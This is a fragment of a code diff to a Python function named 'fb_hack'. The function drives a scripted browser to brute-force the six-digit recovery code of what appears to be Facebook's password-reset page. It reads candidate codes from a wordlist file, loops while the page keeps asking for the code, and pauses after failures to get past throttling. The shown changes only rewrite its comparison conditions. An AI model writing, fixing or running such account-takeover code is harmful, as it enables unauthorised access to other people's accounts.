@@ -82,12 +82,12 @@ def fb_hack(email, codex):
     file.write(str(soup))
   with open("output1.txt", "w") as file:
     file.write(str(soup))
-  if check1 != test:
+  if check1 == "Please check your email for a message with your code. Your code is 6 numbers long.":
     attempt = int(codex)
     print(check1)
     f = open("6digits.txt", "r")
     attempt = int(codex)
-    while check1 != test:
+    while check1 == "Please check your email for a message with your code. Your code is 6 numbers long.":
       browser.select_form(nr=0)
       y = f.readlines(attempt)
       attempt += 1
@@ -103,7 +103,7 @@ def fb_hack(email, codex):
       response1 = browser.response()
       soup = BeautifulSoup(response1, 'html.parser')
       check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
-      if check1 == check3:
+      if check1 == "Please check your email for a message with your code. Your code is 6 numbers long.":
         print(s.join(fail))
         count = 30
         sleepy(count)
